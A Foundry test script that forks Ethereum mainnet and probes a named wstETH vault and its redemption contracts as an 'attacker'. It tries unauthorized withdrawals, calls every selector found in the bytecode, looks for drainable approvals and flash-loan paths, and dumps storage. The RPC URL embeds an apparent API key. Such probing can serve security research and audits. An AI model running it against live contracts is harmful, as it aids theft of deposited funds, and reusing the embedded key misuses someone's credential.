// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IFlashLoan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract VaultDeepDive is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // Flash loan providers
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultContract() public view {
        console.log("=== ANALYZING VAULT CONTRACT ===\n");

        console.log("Vault address:", VAULT);
        console.log("Vault code size:", VAULT.code.length);
        console.log("Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // Check vault storage
        console.log("\nVault storage:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check allowances
        console.log("\nVault allowances:");
        uint256 rcAllowance = IERC20(wstETH).allowance(VAULT, REDEMPTION_CONTROLLER);
        console.log("Vault -> RC allowance:", rcAllowance);
    }

    function test_TryVaultFunctions() public {
        console.log("=== TRYING VAULT FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Known vault selectors from earlier
        // 0xf3fef3a3 - withdraw?
        // 0xbda28203 - ?
        // 0x95079eb9 - ?
        // 0x5467e0a7 - ?
        // 0x50d4b8c9 - ?
        // 0x1177a90d - ?
        // 0x20a0b48f - ?
        // 0x2218cd09 - ?
        // 0x06b70725 - ?
        // 0xc7451193 - ?
        // 0xd2581503 - ?
        // 0x123bbddd - ?

        console.log("Testing vault functions:");

        // withdraw(address,uint256)
        (bool s1, bytes memory d1) = VAULT.call(
            abi.encodeWithSignature("withdraw(address,uint256)", wstETH, 100e18)
        );
        console.log("withdraw(wstETH, 100):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // withdraw(uint256,address)
        (bool s2, bytes memory d2) = VAULT.call(
            abi.encodeWithSignature("withdraw(uint256,address)", 100e18, attacker)
        );
        console.log("withdraw(100, attacker):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // redeem(uint256,address,address)
        (bool s3, bytes memory d3) = VAULT.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 100e18, attacker, VAULT)
        );
        console.log("redeem(100, attacker, VAULT):", s3);
        if (!s3 && d3.length >= 4) console.logBytes4(bytes4(d3));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
    }

    function test_CheckVaultApprovals() public view {
        console.log("=== CHECKING VAULT APPROVALS ===\n");

        // Who has approval to spend Vault's wstETH?
        uint256 rcApproval = IERC20(wstETH).allowance(VAULT, REDEMPTION_CONTROLLER);
        uint256 r0Approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_0);
        uint256 r1Approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_1);

        console.log("Vault approved to RC:", rcApproval);
        console.log("Vault approved to R0:", r0Approval);
        console.log("Vault approved to R1:", r1Approval);

        // Check if vault has infinite approval to RC
        if (rcApproval == type(uint256).max) {
            console.log("\n*** VAULT HAS INFINITE APPROVAL TO RC ***");
            console.log("RC can drain all wstETH from Vault!");
        }
    }

    function test_TryDirectRCInteraction() public {
        console.log("=== TRYING DIRECT RC INTERACTION ===\n");

        // What functions does RC have?
        bytes memory rcCode = REDEMPTION_CONTROLLER.code;

        // Find selectors
        console.log("RC function selectors:");
        bytes4[] memory uniqueSels = new bytes4[](30);
        uint selCount = 0;

        for (uint i = 0; i + 4 < rcCode.length && selCount < 30; i++) {
            if (uint8(rcCode[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(rcCode[i+1], rcCode[i+2], rcCode[i+3], rcCode[i+4]));
                if (sel == 0xffffffff || sel == bytes4(0)) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                    console.logBytes4(sel);
                }
            }
        }

        // Try calling each RC function
        console.log("\nTrying RC functions:");

        vm.startPrank(attacker);

        for (uint i = 0; i < selCount; i++) {
            (bool s,) = REDEMPTION_CONTROLLER.call(
                abi.encodeWithSelector(uniqueSels[i], attacker, 100e18)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(uniqueSels[i]);
            }
        }

        vm.stopPrank();
    }

    function test_CheckFlashLoanScenario() public {
        console.log("=== CHECKING FLASH LOAN SCENARIO ===\n");

        // What if we flash loan a huge amount and use it to manipulate state?

        // Check Aave
        console.log("Checking Aave flash loan availability:");
        (bool hasAave,) = AAVE_POOL.staticcall(
            abi.encodeWithSignature("getReserveData(address)", wstETH)
        );
        console.log("Aave has wstETH reserve:", hasAave);

        // Check Balancer
        console.log("\nChecking Balancer flash loan:");
        uint256 balancerWstETH = IERC20(wstETH).balanceOf(BALANCER_VAULT);
        console.log("Balancer wstETH:", balancerWstETH / 1e18);
    }

    function test_CheckActionChaining() public {
        console.log("=== CHECKING ACTION CHAINING SCENARIOS ===\n");

        // The hint was about "action chaining" - multiple actions in sequence

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Scenario 1: Deposit to vault, then redeem
        console.log("Scenario 1: Deposit -> Redeem");
        deal(wstETH, attacker, 100e18);
        IERC20(wstETH).approve(VAULT, type(uint256).max);

        (bool s1,) = VAULT.call(
            abi.encodeWithSignature("deposit(uint256,address)", 10e18, attacker)
        );
        console.log("deposit(10, attacker):", s1);

        // Scenario 2: Multiple redemption calls
        console.log("\nScenario 2: Multiple redeems");
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("R0.redeem(100):", s2);

        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("R1.redeem(100):", s3);

        vm.stopPrank();
    }

    function test_CheckStorageLayoutForRequests() public view {
        console.log("=== CHECKING STORAGE LAYOUT FOR REQUESTS ===\n");

        // Redemption requests are stored somewhere
        // If we can find and manipulate the storage layout...

        console.log("REDEMPTION_0 storage (slots 5-30):");
        for (uint i = 5; i < 30; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        console.log("\nREDEMPTION_1 storage (slots 6-30):");
        for (uint i = 6; i < 30; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckRequestMappings() public view {
        console.log("=== CHECKING REQUEST MAPPINGS ===\n");

        // Requests might be stored in a mapping(address => Request[])
        // or mapping(address => mapping(uint => Request))

        // Try common mapping patterns
        for (uint baseSlot = 0; baseSlot < 15; baseSlot++) {
            // mapping(address => something) at slot baseSlot
            bytes32 key = keccak256(abi.encode(address(0x1234), baseSlot));
            bytes32 val = vm.load(REDEMPTION_0, key);
            if (val != bytes32(0)) {
                console.log("Found mapping at base slot:", baseSlot);
            }

            // Check for REDEMPTION_CONTROLLER as key
            key = keccak256(abi.encode(REDEMPTION_CONTROLLER, baseSlot));
            val = vm.load(REDEMPTION_0, key);
            if (val != bytes32(0)) {
                console.log("RC in mapping at slot:", baseSlot);
                console.logBytes32(val);
            }
        }
    }
}
